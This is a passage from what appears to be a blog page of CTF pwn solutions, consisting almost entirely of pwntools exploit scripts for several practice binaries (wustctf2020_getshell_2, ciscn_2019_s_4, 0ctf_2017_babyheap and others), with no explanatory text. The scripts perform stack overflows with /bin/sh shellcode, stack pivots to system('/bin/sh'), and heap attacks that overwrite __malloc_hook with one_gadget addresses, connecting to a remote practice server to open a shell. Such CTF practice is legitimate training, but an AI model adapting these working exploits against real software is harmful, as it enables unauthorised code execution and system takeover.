class="string">&quot;\x00&quot;</span>))</span><br><span class="line">l32 = <span class="keyword">lambda</span>      :u32(p.recvuntil(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b  :p.sendlineafter(<span class="built_in">str</span>(a),<span class="built_in">str</span>(b))</span><br><span class="line">sa  = <span class="keyword">lambda</span> a,b  :p.sendafter(<span class="built_in">str</span>(a),<span class="built_in">str</span>(b))</span><br><span class="line">lg  = <span class="keyword">lambda</span> name,data : p.success(name + <span class="string">&quot;: 0x%x&quot;</span> % data)</span><br><span class="line">se  = <span class="keyword">lambda</span> payload: p.send(payload)</span><br><span class="line">rl  = <span class="keyword">lambda</span>      : p.recv()</span><br><span class="line">sl  = <span class="keyword">lambda</span> payload: p.sendline(payload)</span><br><span class="line">ru  = <span class="keyword">lambda</span> a     :p.recvuntil(<span class="built_in">str</span>(a))</span><br><span class="line"><span class="comment"># shellcode = asm(shellcraft.sh())</span></span><br><span class="line">offset = <span class="number">0x14</span></span><br><span class="line">second_write = <span class="number">0x08048087</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;a&quot;</span> * offset + p32(second_write)</span><br><span class="line">sa(<span class="string">&#x27;:&#x27;</span>, payload)</span><br><span class="line">stack = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">lg(<span class="string">&#x27;stack&#x27;</span>, stack)</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">shellcode= <span class="string">&#x27;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80&#x27;</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x14</span> + p32(stack + <span class="number">0x14</span>) + shellcode</span><br><span class="line"></span><br><span class="line">se(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="NO-71-wustctf2020-getshell-2-solve"><a href="#NO-71-wustctf2020-getshell-2-solve" class="headerlink" title="NO.71 wustctf2020_getshell_2_solve"></a>NO.71 wustctf2020_getshell_2_solve</h1><h3 id="exp-71"><a href="#exp-71" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding:utf-8-*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;i386&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">p = process(<span class="string">&#x27;./wustctf2020_getshell_2&#x27;</span>)<span class="comment">#,env=&#123;&#x27;LD_PRELOAD&#x27;:&#x27;./libc.so.6&#x27;&#125;)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">26547</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;wustctf2020_getshell_2&#x27;</span>)</span><br><span class="line">elf = elf.libc</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line">o_g = [<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span class="number">0xf0364</span>,<span class="number">0xf1207</span>]</span><br><span class="line">magic = [<span class="number">0x3c4b10</span>,<span class="number">0x3c67a8</span>,<span class="number">0x846c0</span>,<span class="number">0x45390</span>]<span class="comment">#malloc,free,realloc,system</span></span><br><span class="line">l64 = <span class="keyword">lambda</span>      :u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">l32 = <span class="keyword">lambda</span>      :u32(p.recvuntil(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b  :p.sendlineafter(<span class="built_in">str</span>(a),<span class="built_in">str</span>(b))</span><br><span class="line">sa  = <span class="keyword">lambda</span> a,b  :p.sendafter(<span class="built_in">str</span>(a),<span class="built_in">str</span>(b))</span><br><span class="line">lg  = <span class="keyword">lambda</span> name,data : p.success(name + <span class="string">&quot;: 0x%x&quot;</span> % data)</span><br><span class="line">se  = <span class="keyword">lambda</span> payload: p.send(payload)</span><br><span class="line">rl  = <span class="keyword">lambda</span>      : p.recv()</span><br><span class="line">sl  = <span class="keyword">lambda</span> payload: p.sendline(payload)</span><br><span class="line">ru  = <span class="keyword">lambda</span> a     :p.recvuntil(<span class="built_in">str</span>(a))</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">sl(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span> + <span class="string">&#x27;bbbb&#x27;</span> + p32(<span class="number">0x08048529</span>)+ p32(<span class="number">0x8048670</span>))</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="NO-72-ciscn-2019-s-4-solve"><a href="#NO-72-ciscn-2019-s-4-solve" class="headerlink" title="NO.72 ciscn_2019_s_4_solve"></a>NO.72 ciscn_2019_s_4_solve</h1><h3 id="exp-72"><a href="#exp-72" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding:utf-8-*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">p = process(<span class="string">&#x27;./ciscn_2019_s_4&#x27;</span>)<span class="comment">#,env=&#123;&#x27;LD_PRELOAD&#x27;:&#x27;./libc.so.6&#x27;&#125;)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">28410</span>)</span><br><span class="line"><span class="comment">#elf = ELF(&#x27;ciscn_2019_s_4&#x27;)</span></span><br><span class="line"><span class="comment">#libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line">o_g = [<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span class="number">0xf0364</span>,<span class="number">0xf1207</span>]</span><br><span class="line">magic = [<span class="number">0x3c4b10</span>,<span class="number">0x3c67a8</span>,<span class="number">0x846c0</span>,<span class="number">0x45390</span>]<span class="comment">#malloc,free,realloc,system</span></span><br><span class="line">l64 = <span class="keyword">lambda</span>      :u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">l32 = <span class="keyword">lambda</span>      :u32(p.recvuntil(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b  :p.sendlineafter(<span class="built_in">str</span>(a),<span class="built_in">str</span>(b))</span><br><span class="line">sa  = <span class="keyword">lambda</span> a,b  :p.sendafter(<span class="built_in">str</span>(a),<span class="built_in">str</span>(b))</span><br><span class="line">lg  = <span class="keyword">lambda</span> name,data : p.success(name + <span class="string">&quot;: 0x%x&quot;</span> % data)</span><br><span class="line">se  = <span class="keyword">lambda</span> payload: p.send(payload)</span><br><span class="line">rl  = <span class="keyword">lambda</span>      : p.recv()</span><br><span class="line">sl  = <span class="keyword">lambda</span> payload: p.sendline(payload)</span><br><span class="line">ru  = <span class="keyword">lambda</span> a     :p.recvuntil(<span class="built_in">str</span>(a))</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line">hack = <span class="number">0x804854B</span></span><br><span class="line">leave = <span class="number">0x08048562</span></span><br><span class="line">sys_plt = <span class="number">0x08048400</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x24</span>+<span class="string">&#x27;bbbb&#x27;</span></span><br><span class="line">sa(<span class="string">&#x27;?\n&#x27;</span>, payload)</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">ru(<span class="string">&#x27;b&#x27;</span>*<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">stack = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">lg(<span class="string">&#x27;stack&#x27;</span>, stack)</span><br><span class="line">s_addr = stack - <span class="number">56</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># payload = (&#x27;aaaa&#x27;+p32(sys_plt)+&#x27;bbbb&#x27;+p32(s_addr+16)+&#x27;/bin/sh\x00&#x27;).ljust(0x28,&#x27;a&#x27;)</span></span><br><span class="line"><span class="comment"># payload += p32(s_addr)+p32(leave)</span></span><br><span class="line">payload = p32(sys_plt)+<span class="string">&#x27;aaaa&#x27;</span>+p32(s_addr+<span class="number">12</span>)+<span class="string">&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x28</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">payload += p32(s_addr-<span class="number">4</span>)+p32(leave) <span class="comment"># 出栈的时候会将esp+4 </span></span><br><span class="line">sl(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="NO-73-hitcontraining-magicheap-solve"><a href="#NO-73-hitcontraining-magicheap-solve" class="headerlink" title="NO.73 hitcontraining_magicheap_solve"></a>NO.73 hitcontraining_magicheap_solve</h1><h3 id="exp-73"><a href="#exp-73" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding:utf-8-*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">p = process(<span class="string">&#x27;./hitcontraining_magicheap&#x27;</span>)<span class="comment">#,env=&#123;&#x27;LD_PRELOAD&#x27;:&#x27;./libc.so.6&#x27;&#125;)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">27597</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;hitcontraining_magicheap&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">o_g = [<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span class="number">0xf0364</span>,<span class="number">0xf1207</span>]</span><br><span class="line">magic = [<span class="number">0x3c4b10</span>,<span class="number">0x3c67a8</span>,<span class="number">0x846c0</span>,<span class="number">0x45390</span>]<span class="comment">#malloc,free,realloc,system</span></span><br><span class="line">l64 = <span class="keyword">lambda</span>      :u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">l32 = <span class="keyword">lambda</span>      :u32(p.recvuntil(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b  :p.sendlineafter(<span class="built_in">str</span>(a),<span class="built_in">str</span>(b))</span><br><span class="line">sa  = <span class="keyword">lambda</span> a,b  :p.sendafter(<span class="built_in">str</span>(a),<span class="built_in">str</span>(b))</span><br><span class="line">lg  = <span class="keyword">lambda</span> name,data : p.success(name + <span class="string">&quot;: 0x%x&quot;</span> % data)</span><br><span class="line">se  = <span class="keyword">lambda</span> payload: p.send(payload)</span><br><span class="line">rl  = <span class="keyword">lambda</span>      : p.recv()</span><br><span class="line">sl  = <span class="keyword">lambda</span> payload: p.sendline(payload)</span><br><span class="line">ru  = <span class="keyword">lambda</span> a     :p.recvuntil(<span class="built_in">str</span>(a))</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">magic = <span class="number">0x00006020A0</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size, content</span>):</span></span><br><span class="line">sla(<span class="string">&#x27;choice :&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;Heap : &#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">sla(<span class="string">&#x27;heap:&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx, size, content</span>):</span></span><br><span class="line">sla(<span class="string">&#x27;choice :&#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;Index :&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">sla(<span class="string">&#x27;Heap : &#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">sla(<span class="string">&#x27;heap :&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">remove</span>(<span class="params">idx</span>):</span></span><br><span class="line">sla(<span class="string">&#x27;choice :&#x27;</span>, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;Index :&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x30</span>, <span class="string">&#x27;a&#x27;</span>*<span class="number">0x3</span>)</span><br><span class="line">add(<span class="number">0x30</span>, <span class="string">&#x27;b&#x27;</span>*<span class="number">0x3</span>)</span><br><span class="line">add(<span class="number">0x80</span>, <span class="string">&#x27;c&#x27;</span>*<span class="number">0x3</span>)</span><br><span class="line">add(<span class="number">0x30</span>, <span class="string">&#x27;d&#x27;</span>*<span class="number">0x3</span>)</span><br><span class="line"></span><br><span class="line">remove(<span class="number">2</span>)</span><br><span class="line">payload = <span class="string">&#x27;b&#x27;</span>*<span class="number">0x30</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x91</span>)+p64(magic-<span class="number">0x10</span>)*<span class="number">2</span></span><br><span class="line">edit(<span class="number">1</span>, <span class="number">0x80</span>, payload)</span><br><span class="line"></span><br><span class="line">gdb.attach(p)</span><br><span class="line">add(<span class="number">0x80</span>, <span class="string">&#x27;e&#x27;</span>*<span class="number">0x80</span>)</span><br><span class="line"></span><br><span class="line">gdb.attach(p)</span><br><span class="line">sla(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(<span class="number">4869</span>))</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="NO-74-0ctf-2017-babyheap-solve"><a href="#NO-74-0ctf-2017-babyheap-solve" class="headerlink" title="NO.74 0ctf_2017_babyheap_solve"></a>NO.74 0ctf_2017_babyheap_solve</h1><h3 id="exp-74"><a href="#exp-74" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding:utf-8-*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">p = process(<span class="string">&#x27;./0ctf_2017_babyheap&#x27;</span>,env=&#123;<span class="string">&#x27;LD_PRELOAD&#x27;</span>:<span class="string">&#x27;./libc-2.23.so&#x27;</span>&#125;)  </span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">25178</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line">o_g = [<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line">l64 = <span class="keyword">lambda</span>      :u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b  :p.sendlineafter(<span class="built_in">str</span>(a),<span class="built_in">str</span>(b))</span><br><span class="line">lg  = <span class="keyword">lambda</span> name,data : p.success(name + <span class="string">&quot;: 0x%x&quot;</span> % data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size</span>):</span></span><br><span class="line">sla(<span class="string">&#x27;Command: &#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;: &#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fill</span>(<span class="params">idx, size, content</span>):</span></span><br><span class="line">sla(<span class="string">&#x27;Command: &#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;: &#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">sla(<span class="string">&#x27;: &#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">sla(<span class="string">&#x27;: &#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">idx</span>):</span></span><br><span class="line">sla(<span class="string">&#x27;Command: &#x27;</span>, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;: &#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">sla(<span class="string">&#x27;Command: &#x27;</span>, <span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;: &#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x20</span>)</span><br><span class="line">add(<span class="number">0x20</span>)</span><br><span class="line">add(<span class="number">0x80</span>)</span><br><span class="line">fill(<span class="number">0</span>, <span class="number">0x30</span>, <span class="string">&#x27;a&#x27;</span>*<span class="number">0x20</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x71</span>))</span><br><span class="line">fill(<span class="number">2</span>, <span class="number">0x40</span>, <span class="string">&#x27;b&#x27;</span>*<span class="number">0x30</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x71</span>))</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x60</span>)</span><br><span class="line"></span><br><span class="line">fill(<span class="number">1</span>, <span class="number">0x30</span>, <span class="string">&#x27;c&#x27;</span>*<span class="number">0x20</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x91</span>))</span><br><span class="line">add(<span class="number">0x10</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">main_arena = l64() - <span class="number">88</span></span><br><span class="line">libc_base = main_arena - <span class="number">0x3c4b20</span></span><br><span class="line">lg(<span class="string">&#x27;main_arena&#x27;</span>, main_arena)</span><br><span class="line">lg(<span class="string">&#x27;libc_base&#x27;</span>, libc_base)</span><br><span class="line">malloc_hook = libc_base + libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">lg(<span class="string">&#x27;malloc_hook&#x27;</span>, malloc_hook)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">fill(<span class="number">0</span>, <span class="number">0x40</span>, <span class="string">&#x27;d&#x27;</span>*<span class="number">0x20</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x71</span>)+p64(malloc_hook-<span class="number">0x23</span>)*<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0x60</span>)</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">add(<span class="number">0x60</span>)</span><br><span class="line">payload = <span class="string">&quot;a&quot;</span>*<span class="number">3</span>+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(libc_base+o_g[<span class="number">1</span>])</span><br><span class="line">fill(<span class="number">2</span>,<span class="built_in">len</span>(payload), payload)</span><br><span class="line">add(<span class="number">0x10</span>)</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="NO-75-hitcontraining-heapcreator-solve"><a href="#NO-75-hitcontraining-heapcreator-solve" class="headerlink" title="NO.75 hitcontraining_heapcreator_solve"></a>NO.75 hitcontraining_heapcreator_solve</h1><h3 id="exp-75"><a href="#exp-75" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding:utf-8-*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">p = process(<span class="string">&#x27;./hitcontraining_heapcreator&#x27;</span>,env=&#123;<span class="string">&#x27;LD_PRELOAD&#x27;</span>:<span class="string">&#x27;./libc-2.23.so&#x27;</span>&#125;)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">25068</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;hitcontraining_heapcreator&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line">o_g = [<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span class="number">0xf0364</span>,<span class="number">0xf1207</span>]</span><br><span class="line">magic = [<span class="number">0x3c4b10</span>,<span class="number">0x3c67a8</span>,<span class="number">0x846c0</span>,<span class="number">0x45390</span>]<span class="comment">#malloc,free,realloc,system</span></span><br><span class="line">l64 = <span class="keyword">lambda</span>      :u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span 